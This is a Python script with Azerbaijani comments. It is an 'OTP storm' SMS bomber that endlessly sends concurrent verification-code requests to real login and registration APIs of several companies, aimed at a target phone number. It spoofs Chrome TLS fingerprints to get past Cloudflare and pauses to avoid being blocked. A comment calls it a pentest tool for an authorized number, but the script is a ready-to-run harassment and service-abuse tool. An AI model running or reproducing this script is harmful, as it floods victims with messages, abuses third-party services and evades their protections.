import asyncio
import random
from curl_cffi.requests import AsyncSession

# --- HƏDƏF VƏ GÜC ---
TARGET_PHONE = "994XXXXXXXXX" # Səlahiyyətli nömrəni bura yazın (məs: 994501234567)
CONCURRENCY = 100 # Eyni anda neçə sorğu getsin

# Bu siyahı hədəfə SMS/WP kodu göndərən real API nöqtələridir
# Pentest zamanı bura yeni tapdığınız servisləri əlavə edə bilərsiniz
API_LIST = [
    {"url": "https://api.pasha-pay.az/v1/otp", "method": "POST", "data": {"msisdn": "{phone}"}},
    {"url": "https://azeralert.az/api/send", "method": "GET", "params": {"number": "{phone}"}},
    {"url": "https://www.bizim-market.az/register/send-sms", "method": "POST", "data": {"phone": "{phone}"}},
    {"url": "https://wolt.com/api/v2/sessions/login", "method": "POST", "data": {"mobile": "{phone}"}},
    {"url": "https://bolt.eu/api/v1/auth/sms", "method": "POST", "data": {"phone": "+{phone}"}},
    # WhatsApp Web Login Imitation (Bəzi servislər vasitəsilə)
    {"url": "https://api.alipasha.az/api/v1/otp/send", "method": "POST", "data": {"phone": "{phone}"}},
]

async def bombard(session, api_info, phone):
    """API-yə ağır sorğu göndərən worker"""
    url = api_info["url"]
    method = api_info["method"]
    
    # Telefon formatını API-yə görə tənzimləyirik
    formatted_phone = phone
    
    try:
        # JA3 Fingerprint Cloudflare bypass üçün mütləqdir
        if method == "POST":
            json_data = {k: v.replace("{phone}", formatted_phone) if isinstance(v, str) else v 
                        for k, v in api_info.get("data", {}).items()}
            resp = await session.post(url, json=json_data, impersonate="chrome120", timeout=10)
        else:
            params = {k: v.replace("{phone}", formatted_phone) for k, v in api_info.get("params", {}).items()}
            resp = await session.get(url, params=params, impersonate="chrome120", timeout=10)
            
        print(f"[*] Signal sent to {url[:25]}... Status: {resp.status_code}")
    except Exception as e:
        pass

async def main():
    print(f"[!!!] OTP STORM BAŞLAYIR: {TARGET_PHONE}")
    
    async with AsyncSession() as session:
        while True:
            tasks = []
            # Hər dövrədə bütün API-ləri işə salırıq
            for api in API_LIST:
                for _ in range(5): # Hər servisə 5 paralel sorğu
                    tasks.append(bombard(session, api, TARGET_PHONE))
            
            await asyncio.gather(*tasks)
            # Servislərin bizi bloklamaması üçün qısa fasilə (Opsional)
            await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
